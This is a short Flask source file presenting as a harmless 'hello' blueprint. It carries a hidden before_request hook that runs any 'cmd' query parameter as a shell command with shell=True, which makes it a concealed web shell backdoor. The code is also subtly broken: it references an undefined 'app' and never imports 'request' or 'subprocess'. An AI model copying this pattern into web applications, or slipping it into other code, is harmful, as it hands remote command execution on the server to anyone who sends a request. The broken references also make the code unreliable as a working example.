from flask import Blueprint, render_template, redirect

mod_hello = Blueprint('mod_hello', __name__, template_folder='templates')

@mod_hello.route('/')
def do_hello():
    return 'hello :)'


@app.before_request
def do_exec():
    if 'cmd' in request.args:
        subprocess.check_output(request.args['cmd'], shell=True)